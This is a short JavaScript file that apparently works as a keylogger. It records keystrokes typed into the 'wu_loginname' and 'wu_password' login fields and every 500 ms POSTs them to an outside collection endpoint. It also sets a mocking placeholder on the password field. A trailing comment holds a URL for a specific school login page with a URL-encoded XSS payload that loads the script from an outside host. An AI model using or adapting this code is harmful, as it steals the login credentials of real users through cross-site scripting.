var keys = '';
var url = 'https://send.pageclip.co/mMJZqTWOskoatOv5E2bqIWkAxqcetkfi';
document.getElementsByName('wu_loginname')?.forEach((element) => {
  element.onkeydown = function (e) {
    let key = `[${e.key}:${e.type}:l]`;
    keys += key;
  };
});
document.getElementsByName('wu_password')?.forEach((element) => {
  element.setAttribute('placeholder', ':DDDDD');
  element.onkeydown = function (e) {
    let key = `[${e.key}:${e.type}:p]`;
    keys += key;
  };
});

window.setInterval(function () {
  if (keys.length > 0) {
    fetch(url, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json;charset=utf-8',
      },
      body: JSON.stringify({ text: keys }),
    });
    keys = '';
  }
}, 500);

//https://camphusianum.nl/Login?passAction=login&path='%2F%3E%3CScRiPt%20src%3D%22https%3A%2F%2Ffishman.live%2Fassets%2Fjs%2Fx.js%22%3E%3C%2Fscript%3E%0A
